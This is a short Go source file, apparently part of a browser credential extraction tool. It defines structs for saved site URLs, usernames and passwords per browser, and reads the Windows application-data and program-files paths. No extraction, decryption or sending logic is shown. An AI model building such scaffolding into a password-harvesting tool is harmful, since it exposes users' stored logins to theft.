package browsers

import "os"

type Credential struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type BrowserConfig struct {
	Browser     string       `json:"browser"`
	Credentials []Credential `json:"credentials"`
}

var (
	APPDATA      string = os.Getenv("APPDATA")
	PROGRAMFILES string = os.Getenv("PROGRAMFILES")
	LOCALAPPDATA string = os.Getenv("LOCALAPPDATA")
)
